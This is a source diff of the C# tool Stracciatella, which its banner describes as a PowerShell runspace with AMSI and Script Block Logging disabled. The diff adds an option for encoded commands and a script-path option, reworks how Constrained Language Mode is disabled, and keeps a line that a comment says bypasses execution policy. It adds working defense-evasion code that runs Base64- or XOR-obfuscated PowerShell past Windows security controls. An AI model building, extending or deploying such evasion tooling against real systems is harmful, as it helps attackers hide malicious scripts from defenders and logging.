@@ -22,7 +22,8 @@ namespace Stracciatella
                 "-f", "--force",
                 "-c", "--command",
                 "-b", "--base64",
-                "-x", "--xor"
+                "-x", "--xor",
+                "-e", "--cmdencoded"
             };
 
             public bool Verbose { get; set; }
@@ -32,6 +33,7 @@ namespace Stracciatella
             public bool Force { get; set; }
             public string ScriptPath { get; set; }
             public bool Parashell { get; set; }
+            public bool CmdEncoded { get; set; }
 
             public Options()
             {
@@ -42,6 +44,7 @@ namespace Stracciatella
                 Command = "";
                 ScriptPath = "";
                 Parashell = false;
+                CmdEncoded = false;
             }
         }
 
@@ -51,22 +54,24 @@ namespace Stracciatella
         {
             Console.WriteLine("");
             Console.WriteLine("  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.");
-            Console.WriteLine("  Mariusz B. / mgeeky, '19 <mb@binary-offensive.com>");
+            Console.WriteLine("  Mariusz B. / mgeeky, '19-20 <mb@binary-offensive.com>");
             Console.WriteLine("");
         }
 
         private static void Usage()
         {
             PrintBanner();
-            Console.WriteLine("Usage: stracciatella.exe [options] [script]");
-            Console.WriteLine("  script                - Path to file containing Powershell script to execute. If not options given, will enter a pseudo-shell loop.");
-            Console.WriteLine("  -v, --verbose         - Prints verbose informations");
-            Console.WriteLine("  -f, --force           - Proceed with execution even if Powershell defenses were not disabled. By default we bail out on failure.");
-            Console.WriteLine("  -c, --command         - Executes the specified commands.");
-            Console.WriteLine("                          If command and script parameters were given, executes command after running script.");
-            Console.WriteLine("  -b, --base64          - Consider input as Base64 encoded. If both options, --base64 and --xor are specified,");
-            Console.WriteLine("                          the program will peel them off accordingly: Base64Decode(XorDecode(data, XorKey))");
-            Console.WriteLine("  -x <key>, --xor <key> - Consider input as XOR encoded, where <key> is a hex 8bit value being a key");
+            Console.WriteLine("Usage: stracciatella.exe [options]");
+            Console.WriteLine("  -s <path>, --script <path> - Path to file containing Powershell script to execute. If not options given, will enter a pseudo-shell loop.");
+            Console.WriteLine("  -v, --verbose              - Prints verbose informations");
+            Console.WriteLine("  -f, --force                - Proceed with execution even if Powershell defenses were not disabled. By default we bail out on failure.");
+            Console.WriteLine("  -c, --command              - Executes the specified commands.");
+            Console.WriteLine("                               If command and script parameters were given, executes command after running script.");
+            Console.WriteLine("  -b, --base64               - Consider input as Base64 encoded. If both options, --base64 and --xor are specified,");
+            Console.WriteLine("                               the program will peel them off accordingly: XorDecode(Base64Decode(data), XorKey)");
+            Console.WriteLine("  -x <key>, --xor <key>      - Consider input as XOR encoded, where <key> is a hex 8bit value being a key");
+            Console.WriteLine("  -e, --cmdencoded           - Input command (specified in '--command') is encoded as well, decode it before running. By default this program");
+            Console.WriteLine("                               will decode input file and consider command as given in plaintext. Using this switch tells it otherwise.");
         }
 
         private static Options ParseOptions(string[] args)
@@ -93,6 +98,11 @@ namespace Stracciatella
                 else if (string.Equals(arg, "-b") || string.Equals(arg, "--base64"))
                 {
                     options.Base64 = true;
+                    processed.Add(arg);
+                }
+                else if (string.Equals(arg, "-e") || string.Equals(arg, "--cmdencoded"))
+                {
+                    options.CmdEncoded = true;
                     processed.Add(arg);
                 }
                 else if (string.Equals(arg, "-f") || string.Equals(arg, "--force"))
@@ -129,21 +139,32 @@ namespace Stracciatella
                     processed.Add(args[i + 1]);
                     i += 1;
                 }
+                else if (string.Equals(arg, "-s") || string.Equals(arg, "--script"))
+                {
+                    if (args.Length - 1 < i + 1)
+                    {
+                        throw new ArgumentException("No value for Script argument.");
+                    }
+
+                    string p = args[i + 1];
+                    if(!File.Exists(p))
+                    {
+                        Info($"[-] Script file does not exist. Will not load it: '{p}'");
+                        p = "";
+                    }
+
+                    options.ScriptPath = p;
+                    processed.Add(arg);
+                    processed.Add(args[i + 1]);
+                    i += 1;
+                }
                 else if ((i < args.Length - 1) && !options.ValidOptions.Contains(arg))
                 {
                     throw new ArgumentException($"Unknown parameter '{arg}'.");
                 }
             }
 
-            if ((i - 1 < args.Length) && (File.Exists(args[i - 1])))
-            {
-                options.ScriptPath = args[i - 1];
-            }
-            else if ((i - 1 < args.Length) && !processed.Contains(args[i - 1]))
-            {
-                options.ScriptPath = args[i - 1];
-            }
-            else if (options.Command.Length == 0)
+            if (options.Command.Length == 0)
             {
                 options.Parashell = true;
             }
@@ -160,7 +181,7 @@ namespace Stracciatella
             {
                 if(options.Command.Length == 0 && options.ScriptPath.Length == 0)
                 {
-                    throw new ArgumentException("Specifying Base64 or XorKey options makes no sense if no command or script path given.");
+                    throw new ArgumentException("Specifying Base64 or XorKey options makes no sense if no command or script path was given.");
                 }
             }
 
@@ -192,7 +213,7 @@ namespace Stracciatella
         {
             bool ret = true;
 
-            string l = ExecuteCommand("'{0}.{1}' -f $PSVersionTable.PSVersion.Major, $PSVersionTable.PSVersion.Minor", rs, host, true).Trim();
+            string l = ExecuteCommand("'{0}.{1}' -f $PSVersionTable.PSVersion.Major, $PSVersionTable.PSVersion.Minor", rs, host, true, true).Trim();
             float psversion = 5;
             try
             {
@@ -218,18 +239,30 @@ namespace Stracciatella
                 Info($"[.] Powershell's version: {psversion}");
             }
 
-            ret &= DisableClm.DoDisable(rs);
-
-            l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true);
+            l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true, true).Trim();
             Info($"[.] Language Mode: {l}");
 
-            if(ret && String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase))
+            if (!String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase))
             {
-                Info("[+] Constrained Language Mode Disabled.");
+                DisableClm.DoDisable(rs, ProgramOptions.Verbose);
+
+                l = ExecuteCommand("$ExecutionContext.SessionState.LanguageMode", rs, host, true, true).Trim();
+                Info($"[.] Language Mode after attempting to disable CLM: {l}");
+
+                if (String.Equals(l, "FullLanguage", StringComparison.CurrentCultureIgnoreCase))
+                {
+                    Info("[+] Constrained Language Mode Disabled.");
+                    ret &= true;
+                }
+                else
+                {
+                    Info("[-] Constrained Language Mode not disabled.");
+                    ret &= false;
+                }
             }
             else
             {
-                Info("[-] Constrained Language Mode not disabled.");
+                Info("[+] No need to disable Constrained Language Mode. Already in FullLanguage.");
             }
 
             if ((ret &= DisableScriptLogging(rs)))
@@ -465,10 +498,16 @@ namespace Stracciatella
             string output = "";
             CustomPSHost host = new CustomPSHost();
             var state = InitialSessionState.CreateDefault();
+
+            state.ApartmentState = System.Threading.ApartmentState.STA;
             state.AuthorizationManager = null;                  // Bypasses PowerShell execution policy
+            state.ThreadOptions = PSThreadOptions.UseCurrentThread;
 
             using (Runspace runspace = RunspaceFactory.CreateRunspace(host, state))
             {
+                runspace.ApartmentState = System.Threading.ApartmentState.STA;
+                runspace.ThreadOptions = PSThreadOptions.UseCurrentThread;
+
                 runspace.Open();
 
                 using (var ps = PowerShell.Create())
@@ -488,8 +527,8 @@ namespace Stracciatella
                     {
                         scriptContents = GetFileContents(scriptPath);
 
-                        Info($"PS> & '{scriptPath}'");
-                        output += ExecuteCommand(scriptContents, ps, host);
+                        Info($"PS> . '{scriptPath}'");
+                        output += ExecuteCommand(scriptContents, ps, host, false, false, false);
 
                         scriptContents = "";
                         scriptPath = "";
@@ -497,7 +536,7 @@ namespace Stracciatella
                     }
 
                     Info($"PS> {command}");
-                    output += ExecuteCommand(command, ps, host);
+                    output += ExecuteCommand(command, ps, host, !ProgramOptions.CmdEncoded);
                     command = "";
 
                     System.GC.Collect();
@@ -509,34 +548,44 @@ namespace Stracciatella
             return output.Trim();
         }
 
-        private static string ExecuteCommand(string command, PowerShell rs, CustomPSHost host, bool silent = false)
+        private static string ExecuteCommand(string command, PowerShell rs, CustomPSHost host, bool dontDecode = false, bool silent = false, bool addOutDefault = true)
         {
             string output = "";
             if (command != null && command.Length > 0)
             {
                 using (Pipeline pipe = rs.Runspace.CreatePipeline())
                 {
-                    try
+                    if (!dontDecode)
                     {
-                        if (ProgramOptions.Base64)
+                        try
                         {
-                            command = Decoder.Base64Decode(command);
-                        }
+                            if (ProgramOptions.Base64)
+                            {
+                                command = Decoder.Base64Decode(command);
+                            }
 
-                        if (ProgramOptions.XorKey != 0)
+                            if (ProgramOptions.XorKey != 0)
+                            {
+                                command = Decoder.XorDecode(command, ProgramOptions.XorKey);
+                            }
+                        }
+                        catch (Exception e)
                         {
-                            command = Decoder.XorDecode(command, ProgramOptions.XorKey);
+                            if (!silent) Info($"[-] Could not decode command: {e.Message.ToString()}");
                         }
                     }
-                    catch (Exception e)
+                    else
                     {
-                        if(!silent)
-                            Info($"[-] Could not decode command: {e.Message.ToString()}");
+                        if (!silent)
+                        {
+                            Info($"[?] Decided not to decode input command starting with: '{command.Substring(0, 30)}'");
+                            Info($"[?] If you need that to be decoded as well, use --cmdencoded option.");
+                        }
                     }
 
                     pipe.Commands.AddScript(command);
                     pipe.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
-                    pipe.Commands.Add("Out-default");
+                    if(addOutDefault) pipe.Commands.Add("Out-default");
 
                     try
                     {
@@ -599,11 +648,11 @@ namespace Stracciatella
                     string input;
                     while(true)
                     {
-                        string pwd = ExecuteCommand("(Resolve-Path .\\).Path", ps, host).Trim();
+                        string pwd = ExecuteCommand("(Resolve-Path .\\).Path", ps, host, true, true).Trim();
                         string prompt = $"{GLOBAL_PROMPT_PREFIX} {pwd}> ";
                         input = Input(prompt);
 
-                        string output = ExecuteCommand(input, ps, host);
+                        string output = ExecuteCommand(input, ps, host, true);
                         Console.WriteLine(output);
 
                         if (input == null || input.Length == 0
